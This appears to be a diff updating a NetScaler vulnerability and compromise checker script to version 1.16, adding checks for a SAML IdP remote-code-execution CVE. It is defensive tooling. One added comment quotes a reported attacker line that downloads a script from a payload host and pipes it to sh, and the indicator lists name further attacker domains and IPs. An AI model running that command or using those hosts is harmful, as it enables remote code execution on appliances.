@@ -3,9 +3,10 @@
 # ctx697096_check.sh
 # NetScaler ADC / Gateway precondition checker for CTX697096
 # (CVE-2026-88771 .. CVE-2026-88778), published 2026-09-27,
-# and CTX697174 (CVE-2026-88779, SAML), published 2026-10-03
+# CTX697174 (CVE-2026-88779, SAML), published 2026-10-03,
+# and CTX697191 (CVE-2026-107406, SAML), published 2026-10-08
 #
-# Version: 1.15 (2026-10-08)
+# Version: 1.16 (2026-10-08)
 # Author : Thomas Poppelgaard - Poppelgaard.com ApS
 # License: MIT (see LICENSE). Provided AS IS, no warranty. Read-only - makes no changes.
 #
@@ -31,7 +32,7 @@
 # Exit codes:
 #   0 = build is fixed and no manual follow-up flagged
 #   1 = build is fixed, but follow-up needed (e.g. Enhanced ISN, IoC hits)
-#   2 = build is VULNERABLE (upgrade now) - to CTX697096, or to CVE-2026-88779 when SAML is configured -
+#   2 = build is VULNERABLE (upgrade now) - to CTX697096, or to CVE-2026-88779 / CVE-2026-107406 when SAML is configured -
 #       or (v1.14) the build is fixed but the IoC sweep found COMPROMISE indicators
 #   3 = could not read the config / determine the build
 #
@@ -46,7 +47,7 @@
 # NOT on Citrix IoCs - a clean result does not prove the appliance was not compromised.
 # =============================================================================
 
-VERSION="1.15"
+VERSION="1.16"
 IOCDATE="8 Oct 2026"   # public indicators included up to this date
 IOCYMD=20261008        # v1.15: the same date as YYYYMMDD, for the "this copy is getting old" hint
 START=$(date +%s); EXPT=""
@@ -70,7 +71,7 @@ while [ $# -gt 0 ]; do
     --fixdate) shift; CTXCHK_FIXDATE="$1"; export CTXCHK_FIXDATE ;;
     --fixdate=*) CTXCHK_FIXDATE="${1#--fixdate=}"; export CTXCHK_FIXDATE ;;
     --version) echo "ctx697096_check.sh $VERSION"; exit 0 ;;
-    -h|--help) awk 'NR>2 && /^# =====/{exit} NR>2' "$0"; exit 0 ;;
+    -h|--help) awk 'NR>2 && /^# =====/{exit} NR>2 {sub(/^# ?/, ""); print}' "$0"; exit 0 ;;
     *) CONF="$1" ;;
   esac
   shift
@@ -90,7 +91,7 @@ SELF="$(cd "$(dirname "$0")" 2>/dev/null && pwd)/$(basename "$0")"
 notours() { while IFS= read -r _f; do [ -n "$_f" ] || continue
   case "$_f" in *ctx697096*|*deyda-netscaler*|*gotham_ioc*|*netscaler-ioc*) continue ;; esac
   [ "$_f" = "$SELF" ] && continue
-  head -1 "$_f" 2>/dev/null | grep -q 'CTX697096 + CTX697174 precondition check' && continue
+  head -1 "$_f" 2>/dev/null | grep -qE 'CTX697096 \+ CTX697174( \+ CTX697191)? precondition check' && continue
   echo "$_f"; done; }
 
 # v1.10 --summary: full report to a file on the appliance (default /var/tmp), short summary on screen
@@ -141,6 +142,10 @@ if [ -n "$OUTFILE" ] && [ -z "$CTXCHK_CHILD" ]; then
   if grep -q 'CVE-2026-88779 (SAML memory overflow' "$OUTFILE"; then C9=vulnerable
   elif grep -q 'CVE-2026-88779 - SAML configured (.*), build includes the fix' "$OUTFILE"; then C9=fixed
   elif grep -q 'CVE-2026-88779 - no SAML SP or IdP' "$OUTFILE"; then C9=n/a; else C9=unknown; fi
+  # v1.16: CVE-2026-107406 (CTX697191): vulnerable / fixed / n/a (no SAML, or SP only where only IdP is affected) / unknown
+  if grep -q 'CVE-2026-107406 (SAML memory overflow' "$OUTFILE"; then C10=vulnerable
+  elif grep -q 'CVE-2026-107406 - SAML configured (.*), build includes the fix' "$OUTFILE"; then C10=fixed
+  elif grep -qE 'CVE-2026-107406 - (no SAML SP or IdP|SAML SP only)' "$OUTFILE"; then C10=n/a; else C10=unknown; fi
   # status= is the CTX697096 build status; a CTX697096-fixed SAML box below the CVE-2026-88779 build shows
   # status=FIXED cve88779=vulnerable verdict=VULNERABLE_CVE-2026-88779 (unless compromise indicators were found)
   # v1.15: an OK verdict without the IoC sweep must not read as "clean"
@@ -148,10 +153,14 @@ if [ -n "$OUTFILE" ] && [ -z "$CTXCHK_CHILD" ]; then
   if [ "$C9" = vulnerable ] && grep -q 'includes the CTX697096 fixes' "$OUTFILE"; then
     ST=FIXED; [ "$V" = VULNERABLE ] && V=VULNERABLE_CVE-2026-88779
   fi
+  # v1.16: CTX697096-fixed SAML box below the CVE-2026-107406 build: status=FIXED cve107406=vulnerable
+  if [ "$C10" = vulnerable ] && grep -qE 'includes the CTX697096( and CVE-2026-88779)? fixes' "$OUTFILE"; then
+    ST=FIXED; case "$V" in VULNERABLE|VULNERABLE_CVE-2026-88779) V=VULNERABLE_CVE-2026-107406 ;; esac
+  fi
   RT=$(sed -n 's/^Done in \([0-9hms ]*\)[.(].*/\1/p' "$OUTFILE" | head -1 | tr -d ' ')
   # v1.15: NSIP from the report's "Appliance:" line ("hidden" with --hide-ip)
   NSIPV=$(sed -n 's/^Appliance: .*  -  NSIP \([^ ]*\)  -  .*/\1/p' "$OUTFILE" | head -1)
-  RESLINE="CTX697096 checker $VERSION: host=$H nsip=${NSIPV:-?} build=${BLD:-?} status=$ST isn=$ISN compromise=$CMP targeted=$TGT saml=$SAML cve88779=$C9 verdict=$V runtime=${RT:-?}"
+  RESLINE="CTX697096 checker $VERSION: host=$H nsip=${NSIPV:-?} build=${BLD:-?} status=$ST isn=$ISN compromise=$CMP targeted=$TGT saml=$SAML cve88779=$C9 cve107406=$C10 verdict=$V runtime=${RT:-?}"
   echo "$RESLINE" >> "$OUTFILE"
   if [ "$SUMMARY" -eq 1 ]; then
     # the result line, then the red findings and the verdict
@@ -251,11 +260,12 @@ fixtag() {
 # v1.11: 2 Oct 2026 00:00 (appliance time) - from then on the SAML attack (CVE-2026-88779, CTX697174) was reported
 # running injected commands on CTX697096-fixed builds
 NVT=$(perl -MTime::Local -e 'print timelocal(0,0,0,2,9,2026)' 2>/dev/null)
-# v1.12: n9win counts the [after fix] lines (stdin) dated from 2 Oct up to the start of the CVE-2026-88779 fix (F9T,
+# v1.12: n9win counts the [after fix] lines (stdin) dated from 2 Oct up to the start of the CVE-2026-88779 fix (v1.16: FWT,
+# the CVE-2026-107406 fix on SAML IdP boxes;
 # empty = not fixed yet) - the window in which an injected command may have run on a CTX697096-fixed build
 n9win() {
   grep '^\[after fix\]' | sed 's/^\[after fix\] //' | fixtag "$NVT" | grep '^\[after fix\]' | sed 's/^\[after fix\] //' \
-    | { if [ -n "$F9T" ]; then fixtag "$F9T" | grep -c '^\[BEFORE fix\]'; else grep -c .; fi; }
+    | { if [ -n "$FWT" ]; then fixtag "$FWT" | grep -c '^\[BEFORE fix\]'; else grep -c .; fi; }
 }
 # BEFORE-fix lines first (order otherwise kept), so they are never hidden behind "... and N more"
 bfirst() { awk '/^\[BEFORE fix\]/{print; next} {r[++n]=$0} END{for(i=1;i<=n;i++) print r[i]}'; }
@@ -326,7 +336,7 @@ else
 NSIP=$(grep -m1 -iE '^set ns config .*-IPAddress' "$CONF" 2>/dev/null | sed -nE 's/.*-IPAddress[[:space:]]+"?([0-9.]+|[0-9a-fA-F:]+).*/\1/p')
 [ -n "$NSIP" ] || NSIP="unknown"
 [ -n "$CTXCHK_HIDEIP" ] && NSIP="hidden"
-printf '%sCTX697096 + CTX697174 precondition check v%s%s (indicators up to %s)\n' "$B" "$VERSION" "$N" "$IOCDATE"
+printf '%sCTX697096 + CTX697174 + CTX697191 precondition check v%s%s (indicators up to %s)\n' "$B" "$VERSION" "$N" "$IOCDATE"
 printf 'Appliance: %s%s%s  -  NSIP %s%s%s  -  config %s  -  %s\n' \
   "$B" "$(hostname 2>/dev/null)" "$N" "$B" "$NSIP" "$N" "$CONF" "$(date '+%Y-%m-%d %H:%M')"
 # v1.15: warn when this copy is more than 7 days older than today - new attack techniques are added often
@@ -370,6 +380,9 @@ if [ "$CONF" = "/nsconfig/ns.conf" ] && [ -d /netscaler ]; then
 fi
 
 VULN_BUILD=""; FIX9=""; BUILD9="unknown"
+# v1.16: CVE-2026-107406 (CTX697191, 8 Oct): FIX10 = fixed build, BUILD10 = yes / no / gap / unknown,
+# BAND10 = idp (73.37-73.41 / 64.23-64.28 / FIPS 37.279-37.282: affected only as SAML IdP) or spidp (older: SP or IdP)
+FIX10=""; BUILD10="unknown"; BAND10=""
 if [ -z "$REL" ]; then
   warn "Could not read build from config header. Check with: show ns version"
   VULN_BUILD="unknown"
@@ -382,28 +395,36 @@ else
         warn "14.1 build $BMAJ.$BMIN looks like FIPS numbering - verify against 14.1-73.37 FIPS"
         VULN_BUILD="unknown"
       elif ge 73 37; then VULN_BUILD="no"; else VULN_BUILD="yes"; fi
-      FIXED="14.1-73.37"; FIX9="14.1-73.41"; [ "$BMAJ" -ne 37 ] && { if ge 73 41; then BUILD9="no"; else BUILD9="yes"; fi; } ;;
+      FIXED="14.1-73.37"; FIX9="14.1-73.41"; FIX10="14.1-73.46"
+      if [ "$BMAJ" -ne 37 ]; then
+        if ge 73 41; then BUILD9="no"; else BUILD9="yes"; fi
+        if ge 73 46; then BUILD10="no"; elif ge 73 42; then BUILD10="gap"; elif ge 73 37; then BUILD10="yes"; BAND10="idp"; else BUILD10="yes"; BAND10="spidp"; fi
+      fi ;;
     13.1)
       if [ "$BMAJ" -eq 37 ]; then
         # 13.1-FIPS / NDcPP train
         if ge 37 279; then VULN_BUILD="no"; else VULN_BUILD="yes"; fi
-        FIXED="13.1-37.279 (FIPS/NDcPP)"; FIX9="13.1-37.282 (FIPS/NDcPP)"
+        FIXED="13.1-37.279 (FIPS/NDcPP)"; FIX9="13.1-37.282 (FIPS/NDcPP)"; FIX10="13.1-37.283 (FIPS/NDcPP)"
         if ge 37 282; then BUILD9="no"; else BUILD9="yes"; fi
+        if ge 37 283; then BUILD10="no"; elif ge 37 279; then BUILD10="yes"; BAND10="idp"; else BUILD10="yes"; BAND10="spidp"; fi
       else
         # Bulletin lists 64.23 as fixed; the released (GA) build is 13.1-64.24
         if ge 64 23; then VULN_BUILD="no"; else VULN_BUILD="yes"; fi
-        FIXED="13.1-64.24"; FIX9="13.1-64.28"
+        FIXED="13.1-64.24"; FIX9="13.1-64.28"; FIX10="13.1-64.29"
         if ge 64 28; then BUILD9="no"; else BUILD9="yes"; fi
+        if ge 64 29; then BUILD10="no"; elif ge 64 23; then BUILD10="yes"; BAND10="idp"; else BUILD10="yes"; BAND10="spidp"; fi
       fi ;;
     *)
-      VULN_BUILD="eol"; FIXED="14.1-73.41 (release $REL is end of life)"; FIX9="14.1-73.41"; BUILD9="yes" ;;
+      VULN_BUILD="eol"; FIXED="14.1-73.46 (release $REL is end of life)"; FIX9="14.1-73.46"; BUILD9="yes"; FIX10="14.1-73.46"; BUILD10="yes"; BAND10="spidp" ;;
   esac
   # v1.12: install the CVE-2026-88779 build (CTX697174, 3 Oct) - it contains the CTX697096 fixes as well
+  # v1.16: install the CVE-2026-107406 build (CTX697191, 8 Oct) - it contains all three fixes
   case "$VULN_BUILD" in
-    yes)     hit "Running $REL-$BMAJ.$BMIN - VULNERABLE. Fixed in $FIXED or later - install ${FIX9:-$FIXED} (also fixes CVE-2026-88779)." ;;
+    yes)     hit "Running $REL-$BMAJ.$BMIN - VULNERABLE. Fixed in $FIXED or later - install ${FIX10:-${FIX9:-$FIXED}} (also fixes CVE-2026-88779 and CVE-2026-107406)." ;;
     eol)     hit "Running $REL-$BMAJ.$BMIN - end-of-life release, no fix. Upgrade to $FIXED." ;;
-    no)      if [ "$BUILD9" = "no" ]; then fixd "Running $REL-$BMAJ.$BMIN - includes the CTX697096 and CVE-2026-88779 fixes."
-             else fixd "Running $REL-$BMAJ.$BMIN - includes the CTX697096 fixes (recommended: ${FIX9:-$FIXED} or later, which also fixes CVE-2026-88779)."; fi ;;
+    no)      if [ "$BUILD10" = "no" ]; then fixd "Running $REL-$BMAJ.$BMIN - includes the CTX697096, CVE-2026-88779 and CVE-2026-107406 fixes."
+             elif [ "$BUILD9" = "no" ]; then fixd "Running $REL-$BMAJ.$BMIN - includes the CTX697096 and CVE-2026-88779 fixes (recommended: ${FIX10:-$FIX9} or later, which also fixes CVE-2026-107406)."
+             else fixd "Running $REL-$BMAJ.$BMIN - includes the CTX697096 fixes (recommended: ${FIX10:-${FIX9:-$FIXED}} or later, which also fixes CVE-2026-88779 and CVE-2026-107406)."; fi ;;
   esac
 fi
 echo
@@ -540,7 +561,7 @@ if [ "$S9SP" -eq 0 ] && [ "$S9IDP" -eq 0 ]; then
 elif [ "$BUILD9" = "no" ]; then
   fixd "CVE-2026-88779 - SAML configured ($S9CFG), build includes the fix"
 elif [ "$BUILD9" = "yes" ]; then
-  hit "CVE-2026-88779 (SAML memory overflow/DoS, 8.7, targeted attacks) - SAML configured ($S9CFG) and build below $FIX9. Upgrade to $FIX9 or later."
+  hit "CVE-2026-88779 (SAML memory overflow/DoS, 8.7, targeted attacks) - SAML configured ($S9CFG) and build below $FIX9. Upgrade to ${FIX10:-$FIX9} or later (also fixes CVE-2026-107406)."
   VULN9=1
   # v1.13: CISA KEV 4 Oct 2026 (US federal deadline 7 Oct); Kevin Beaumont: a patched (CTX697096) honeypot ran downloaded malware
   note "Actively exploited: on CISA's Known Exploited Vulnerabilities list since 4 Oct 2026 (US federal deadline 7 Oct)."
@@ -554,6 +575,40 @@ elif [ "$BUILD9" = "yes" ]; then
   fi
 else
   warn "CVE-2026-88779 - SAML configured ($S9CFG) but the build could not be compared - check show ns version against CTX697174 (fixed: 14.1-73.41, 13.1-64.28, 14.1-73.41 FIPS, 13.1-37.282 FIPS/NDcPP)"
+  FOLLOWUP=1
+fi
+echo
+
+# ---------------------------------------------------------------------------
+# 2c. v1.16: CVE-2026-107406 (CTX697191, 8 Oct 2026) - SAML memory overflow leading to remote code execution or
+#     denial of service, CVSS 9.5, critical. Preconditions depend on the build:
+#       14.1-73.37..73.41, 14.1-FIPS 73.37..73.41, 13.1-64.23..64.28, 13.1-FIPS/NDcPP 37.279..37.282 (the builds
+#       already fixed for CTX697096 / CVE-2026-88779): affected only as a SAML IdP ("add authentication samlIdPProfile")
+#       older builds: affected as a SAML SP ("add authentication samlAction") or SAML IdP
+#     Fixed in 14.1-73.46, 13.1-64.29, 14.1-73.46 FIPS and 13.1-37.283 FIPS/NDcPP. No workaround in the bulletin.
+#     Secure Private Access hybrid deployments using NetScaler are affected as well.
+# ---------------------------------------------------------------------------
+echo "${B}CVE-2026-107406 (CTX697191, SAML - separate bulletin, 8 Oct 2026)${N}"
+VULN10=0
+if [ "$S9SP" -eq 0 ] && [ "$S9IDP" -eq 0 ]; then
+  ok "CVE-2026-107406 - no SAML SP or IdP configured ($S9CFG) - not affected"
+elif [ "$BUILD10" = "no" ]; then
+  fixd "CVE-2026-107406 - SAML configured ($S9CFG), build includes the fix"
+elif [ "$BUILD10" = "yes" ] && [ "$BAND10" = "idp" ] && [ "$S9IDP" -eq 0 ]; then
+  ok "CVE-2026-107406 - SAML SP only ($S9CFG): on $REL-$BMAJ.$BMIN Citrix lists it as affected only as a SAML IdP - not affected"
+  note "Adding a SAML IdP profile later? Upgrade to $FIX10 first."
+elif [ "$BUILD10" = "yes" ]; then
+  if [ "$BAND10" = "idp" ]; then _r="SAML IdP configured ($S9CFG) on $REL-$BMAJ.$BMIN"; else _r="SAML configured ($S9CFG) on a build below the CTX697096 fix"; fi
+  hit "CVE-2026-107406 (SAML memory overflow - remote code execution or DoS, 9.5, critical) - $_r. Upgrade to $FIX10 or later."
+  VULN10=1
+  [ "$BAND10" = "idp" ] && note "Already upgraded for CTX697096 and CVE-2026-88779? Citrix: SAML IdP appliances must be upgraded AGAIN, to $FIX10."
+  note "The bulletin lists no workaround. Secure Private Access hybrid deployments using NetScaler are affected too."
+  note "Remote code execution: run the full check (the default on the appliance) to look for signs of compromise."
+elif [ "$BUILD10" = "gap" ]; then
+  warn "CVE-2026-107406 - SAML configured ($S9CFG) on $REL-$BMAJ.$BMIN, a build CTX697191 does not list - verify with Citrix (fixed: 14.1-73.46, 13.1-64.29, 14.1-73.46 FIPS, 13.1-37.283 FIPS/NDcPP)"
+  FOLLOWUP=1
+else
+  warn "CVE-2026-107406 - SAML configured ($S9CFG) but the build could not be compared - check show ns version against CTX697191 (fixed: 14.1-73.46, 13.1-64.29, 14.1-73.46 FIPS, 13.1-37.283 FIPS/NDcPP)"
   FOLLOWUP=1
 fi
 echo
@@ -700,13 +755,17 @@ if [ "$DO_IOC" -eq 1 ]; then
     # CTX697096-fixed build (73.37 / 64.24). The CTX697096 fix then started with that earlier build, so use the
     # oldest kernel in /flash that already has the CTX697096 fix. F9T = when the CVE-2026-88779 fix started.
     F9T=""
+    # v1.16: FWT = end of the window in which injected commands may have run on a CTX697096-fixed build, WLBL = the fix
+    # that closes it. SAML IdP boxes: CVE-2026-107406 (CTX697191, remote code execution) is open on 73.37-73.41 /
+    # 64.23-64.28 / FIPS 37.279-37.282 as well, so for them the window lasts until the CVE-2026-107406 fix.
+    FWT=""; WLBL="CVE-2026-88779"
     if [ "$VULN_BUILD" = "no" ] && [ -n "$FIXT" ]; then
       case "$REL" in
-        14.1) T1M=73; T1N=37; T9M=73; T9N=41 ;;
-        13.1) if [ "$BMAJ" -eq 37 ]; then T1M=37; T1N=279; T9M=37; T9N=282; else T1M=64; T1N=23; T9M=64; T9N=28; fi ;;
-        *) T1M=""; T9M="" ;;
+        14.1) T1M=73; T1N=37; T9M=73; T9N=41; T10M=73; T10N=46 ;;
+        13.1) if [ "$BMAJ" -eq 37 ]; then T1M=37; T1N=279; T9M=37; T9N=282; T10M=37; T10N=283; else T1M=64; T1N=23; T9M=64; T9N=28; T10M=64; T10N=29; fi ;;
+        *) T1M=""; T9M=""; T10M="" ;;
       esac
-      K1T=""; K1F=""; K9T=""; K9F=""
+      K1T=""; K1F=""; K9T=""; K9F=""; K10T=""; K10F=""
       for k in /flash/ns-"$REL"-*.gz; do
         [ -f "$k" ] && [ -n "$T1M" ] || continue
         kb=$(echo "${k##*/}" | sed -n "s/^ns-$REL-\([0-9][0-9]*\)\.\([0-9][0-9]*\).*/\1 \2/p"); [ -n "$kb" ] || continue
@@ -720,9 +779,19 @@ if [ "$DO_IOC" -eq 1 ]; then
         if [ "$km" -gt "$T9M" ] || { [ "$km" -eq "$T9M" ] && [ "$kn" -ge "$T9N" ]; }; then
           { [ -z "$K9T" ] || [ "$kt" -lt "$K9T" ]; } && { K9T=$kt; K9F=$k; }
         fi
+        if [ -n "$T10M" ] && { [ "$km" -gt "$T10M" ] || { [ "$km" -eq "$T10M" ] && [ "$kn" -ge "$T10N" ]; }; }; then
+          { [ -z "$K10T" ] || [ "$kt" -lt "$K10T" ]; } && { K10T=$kt; K10F=$k; }
+        fi
       done
       if [ "$BUILD9" = "no" ]; then
         if [ -n "$K9F" ] && [ "$K9F" != "$KF" ]; then F9T=$K9T; else F9T=$FIXT; fi
+      fi
+      FWT=$F9T
+      if [ "${S9IDP:-0}" -gt 0 ]; then
+        WLBL="CVE-2026-107406"; FWT=""
+        if [ "$BUILD10" = "no" ]; then
+          if [ -n "$K10F" ] && [ "$K10F" != "$KF" ]; then FWT=$K10T; else FWT=$FIXT; fi
+        fi
       fi
       if [ -n "$K1F" ] && [ "$K1F" != "$KF" ] && [ "$K1T" -lt "$FIXT" ]; then
         FIXT=$K1T; FIXSRC="install time of ${K1F##*/}, the first fixed build still in /flash"
@@ -741,7 +810,8 @@ if [ "$DO_IOC" -eq 1 ]; then
       if [ -n "$FIXT" ]; then
         okay "Fixed build running since $(fmtdate "$FIXT") ($FIXSRC$( [ -n "$KF" ] && [ "$FIXSRC" != "kernel install time" ] && echo "; ${KF##*/} installed $(fmtdate "$INST")")) - exposure window ended here"
         note "Attack lines are tagged [BEFORE fix] / [after fix] against this time. Wrong? Set it with --fixdate \"YYYY-MM-DD HH:MM\"."
-        [ -n "$F9T" ] && [ "$F9T" != "$FIXT" ] && note "CVE-2026-88779 fix (SAML) running since $(fmtdate "$F9T") - injected commands from 2 Oct up to then may have run."
+        [ -n "$FWT" ] && [ "$FWT" != "$FIXT" ] && note "$WLBL fix (SAML$( [ "$WLBL" = CVE-2026-107406 ] && echo ' IdP')) running since $(fmtdate "$FWT") - injected commands from 2 Oct up to then may have run."
+        [ "$WLBL" = CVE-2026-107406 ] && [ -z "$FWT" ] && note "SAML IdP on a build without the CVE-2026-107406 fix (remote code execution): injected commands since 2 Oct may have run."
       else
         warn "Could not determine when the fixed build was installed - attack lines are not tagged before/after the fix"
         note "Set the date by hand: sh ctx697096_check.sh --ioc --fixdate \"YYYY-MM-DD HH:MM\""
@@ -1151,15 +1221,16 @@ $line" ;;
       # 2 Oct until that fix started running (F9T) are therefore no longer "cannot run".
       N_NEW=$(echo "$INJ" | n9win)
       if [ "$VULN_BUILD" = "no" ] && [ -n "$FIXT" ] && [ "$N_ALL" -eq "$N_AFT" ] && [ "${N_NEW:-0}" -gt 0 ]; then
-        susp "ns.log / nsvpn.log entries with shell injection patterns - all $N_ALL after the fixed build, $N_NEW of them since 2 Oct on a build without the CVE-2026-88779 fix (may have run):"
+        susp "ns.log / nsvpn.log entries with shell injection patterns - all $N_ALL after the fixed build, $N_NEW of them since 2 Oct on a build without the $WLBL fix (may have run):"
         echo "$INJ" | show 10
         note "Since 2 Oct commands were reported running on CTX697096-fixed builds (SAML attack, CVE-2026-88779). Citrix classifies"
         note "CVE-2026-88779 as denial of service - still treat these attempts as possibly run until the checks below are clean."
+        [ "$WLBL" = CVE-2026-107406 ] && note "SAML IdP: CVE-2026-107406 (CTX697191, 8 Oct) is a remote code execution on these builds - fixed in ${FIX10:-the new build}."
         note "Check the files they tried to write (checked below), outbound connections to the download hosts in your firewall logs, and contact Citrix Support."
       elif [ "$VULN_BUILD" = "no" ] && [ -n "$FIXT" ] && [ "$N_ALL" -eq "$N_AFT" ]; then
-        warn "ns.log / nsvpn.log entries with shell injection patterns - all $N_ALL AFTER the fixed build started running ($(fmtdate "$FIXT")), none since 2 Oct on a build without the CVE-2026-88779 fix:"
+        warn "ns.log / nsvpn.log entries with shell injection patterns - all $N_ALL AFTER the fixed build started running ($(fmtdate "$FIXT")), none since 2 Oct on a build without the $WLBL fix:"
         echo "$INJ" | show 10
-        note "Attempts after the fix - before 2 Oct, or after the CVE-2026-88779 fix - could not run commands: targeted, not compromised."
+        note "Attempts after the fix - before 2 Oct, or after the $WLBL fix - could not run commands: targeted, not compromised."
       else
         susp "ns.log / nsvpn.log entries with shell injection patterns ($N_ALL line(s)$( [ "$N_BEF" -gt 0 ] && echo ", $N_BEF BEFORE the fix - shown first")) - CVE-2026-88771 exploitation attempts, check whether they succeeded:"
         echo "$INJ" | show 10
@@ -1376,10 +1447,14 @@ $SHXL"
     GN_IPS="$GN_IPS 176.65.148.54 137.220.53.135 45.59.125.187 130.12.182.7 46.151.182.131"
     # + v1.15 Beazley Security Labs (BSL-A1216, updated 4 Oct; via Gotham Technology Group): exploit-delivery servers
     GN_IPS="$GN_IPS 104.207.47.54 104.207.46.202 104.207.32.77"
+    # + v1.16 community report (World of EUC Slack, 8 Oct): new overnight wave, pitboss login injection
+    #   curl${IFS}-sSLk${IFS}https://v5v.in/r.sh?k=<key>|sh - payload host v5v.in, IP 72.5.65.111
+    GN_IPS="$GN_IPS 72.5.65.111"
     GN_IPRE=$(echo "$GN_IPS" | sed -e 's/\./\\./g' -e 's/ /|/g')
     # v1.12: pyrlnk.cc removed - an unregistered spelling variant of pylrk.cc (WHOIS, DNS and CT logs show only pylrk.cc,
     # registered 2 Oct; issue #3, Emil Stahl / PitScaler.com)
-    GN_DOM='pylrk\.cc|oast\.fun|dnsl\.cc|gs\.thc\.org|echvista\.com|entretiensol\.com|white-guard\.pro|gsocket\.io|garyvard\.com|hickoryusedauto\.com|gurerasfalt\.com|rockinroyaltykids\.com|currydownsrvpark\.com|webhook\.site|dnshook\.site|pinggy\.net|serveousercontent\.com'
+    GN_DOM='pylrk\.cc|oast\.fun|dnsl\.cc|gs\.thc\.org|echvista\.com|entretiensol\.com|white-guard\.pro|gsocket\.io|garyvard\.com|hickoryusedauto\.com|gurerasfalt\.com|rockinroyaltykids\.com|currydownsrvpark\.com|webhook\.site|dnshook\.site|pinggy\.net|serveousercontent\.com|v5v\.in'
+    # v1.16 community report (8 Oct): v5v.in - payload host of the overnight pitboss wave (r.sh?k=<key>|sh)
     # v1.15 Huntback.io (7 Oct): pinggy.net / serveousercontent.com - SSH tunnel services that fronted two droppers
     # v1.12: webhook.site / dnshook.site - request-capture services used for exfiltration in the second wave (Beazley, via Gotham)
     # Opportunistic scanners tagged by GreyNoise after the public PoC (via PitScaler.com): hunting leads only.
@@ -2116,9 +2191,9 @@ ${tg}$(echo "$x" | cut -c1-16)... -> $d"
         echo "$TGT" | grep -v '^$' | show $_tgn
         tgsum | grep -v '^#' | while IFS= read -r _l; do note "$_l"; done
         if [ "$(echo "$ALLTGT" | n9win)" -gt 0 ]; then
-          note "Since 2 Oct the SAML attack (CVE-2026-88779) was reported running commands on CTX697096-fixed builds: injected commands from 2 Oct until the CVE-2026-88779 fix may have run (a 404 on a probe still means that probe found nothing)."
+          note "Since 2 Oct the SAML attack (CVE-2026-88779) was reported running commands on CTX697096-fixed builds: injected commands from 2 Oct until the $WLBL fix may have run (a 404 on a probe still means that probe found nothing)."
         else
-          note "Attempts after the fix - before 2 Oct, or after the CVE-2026-88779 fix - could not run commands. A 404 on a canary/alias check confirms it failed."
+          note "Attempts after the fix - before 2 Oct, or after the $WLBL fix - could not run commands. A 404 on a canary/alias check confirms it failed."
         fi
         note "Still review the time BEFORE the fix: logs may not reach back, so use firewall logs for that period."
       else
@@ -2281,6 +2356,7 @@ $u - not in $LASTW (saved $(fmtdate "$(mtime "$LASTW")")), so added after that"
         N9C=0; [ -n "$F9T" ] && N9C=$(echo "$AAAL" | sed -E 's/^\[(after fix|BEFORE fix)\] //' | fixtag "$F9T" | grep -c '^\[after fix\]')
         note "SAML config: $SAMLCFG. This build has the CVE-2026-88779 fix$( [ -n "$F9T" ] && echo " (running since $(fmtdate "$F9T"))")."
         [ "${N9C:-0}" -gt 0 ] && note "$N9C crash line(s) AFTER the CVE-2026-88779 fix started - send the core files from /var/core to Citrix Support."
+        [ "${VULN10:-0}" -eq 1 ] && note "This build is still affected by CVE-2026-107406 (CTX697191, SAML IdP, remote code execution) - crashes may be attempts on it. Upgrade to $FIX10."
       elif [ "${SAMLSP:-0}" -eq 0 ] && [ "${SAMLIDP:-0}" -eq 0 ]; then
         note "SAML config: $SAMLCFG - CVE-2026-88779 (SAML) does not apply, so these crashes have another cause."
       else
@@ -2293,6 +2369,7 @@ $u - not in $LASTW (saved $(fmtdate "$(mtime "$LASTW")")), so added after that"
     elif [ "${SAMLSP:-0}" -gt 0 ] || [ "${SAMLIDP:-0}" -gt 0 ]; then
       if [ "$BUILD9" = "no" ]; then
         okay "SAML configured ($SAMLCFG), no nsaaad crashes found - this build has the CVE-2026-88779 fix"
+        [ "${VULN10:-0}" -eq 1 ] && note "CVE-2026-107406 (CTX697191) is NOT fixed on this build for a SAML IdP - upgrade to $FIX10 (see above)."
         [ "$SAMLWA" -gt 0 ] && note "Interim policy still bound ($SAMLWAN) - no longer needed once every HA node runs the fixed build; remove it after testing."
       else
         if [ "$NFE" -gt 0 ] && [ "$NCOV" -ge "$NFE" ]; then
@@ -2394,7 +2471,7 @@ $u - not in $LASTW (saved $(fmtdate "$(mtime "$LASTW")")), so added after that"
            m=$(mtime "$x"); [ -n "$m" ] || continue
            # v1.14: this checker's own saved reports (--out, --summary or a shell redirect), recognised by their first line
            case "$x" in /tmp/*.txt|/var/tmp/*.txt)
-             head -1 "$x" 2>/dev/null | grep -q '^CTX697096 + CTX697174 precondition check' && continue ;;
+             head -1 "$x" 2>/dev/null | grep -qE '^CTX697096 \+ CTX697174( \+ CTX697191)? precondition check' && continue ;;
            esac
            # NetScaler Console Security Advisory scan: detection scripts plus its log.txt / results.txt
            case "$x" in /var/tmp/*-detection.py|/var/tmp/*_detection.py|/var/tmp/*_detetction.py) continue ;; esac
@@ -2518,18 +2595,18 @@ else
   echo "Done in $RUNT (checker v$VERSION)."
 fi
 echo "============================================================================"
-[ "$IOC_SKIPPED" -eq 1 ] && { [ "$VULN_BUILD" != no ] || [ "$FOLLOWUP" -eq 1 ] || [ "$ISN_OPEN" -eq 1 ] || [ "${VULN9:-0}" -eq 1 ]; } && echo "(Compromise NOT checked: $( [ -d /netscaler ] && echo 'run: sh ctx697096_check.sh --summary' || echo 'offline config - run on the appliance'). Upgrading does not remove an attacker who is already in.)"
+[ "$IOC_SKIPPED" -eq 1 ] && { [ "$VULN_BUILD" != no ] || [ "$FOLLOWUP" -eq 1 ] || [ "$ISN_OPEN" -eq 1 ] || [ "${VULN9:-0}" -eq 1 ] || [ "${VULN10:-0}" -eq 1 ]; } && echo "(Compromise NOT checked: $( [ -d /netscaler ] && echo 'run: sh ctx697096_check.sh --summary' || echo 'offline config - run on the appliance'). Upgrading does not remove an attacker who is already in.)"
 case "$VULN_BUILD" in
   yes|eol)
     # v1.14: vulnerable AND compromised - preserve evidence before the upgrade (an upgrade/reboot wipes /tmp and running processes)
     if [ -n "$COMP" ]; then
       printf '%sVERDICT: COMPROMISED and VULNERABLE - follow CTX694799 first.%s The compromise indicators above show an attacker ran commands.\n' "$R$B" "$N"
       echo "Do NOT reboot or upgrade yet: copy this report and /var/log off the box, isolate it, collect 'show techsupport',"
-      echo "then rebuild on a fixed build${FIX9:+ ($FIX9 or later)} and rotate ALL keys, certificates and passwords."
+      echo "then rebuild on a fixed build${FIX10:+ ($FIX10 or later)} and rotate ALL keys, certificates and passwords."
       exit 2
     fi
     printf '%sVERDICT: VULNERABLE - upgrade now.%s The fixed build covers all eight CVEs in CTX697096; CVE-2026-88771 and -88772 are exploited in the wild.\n' "$R$B" "$N"
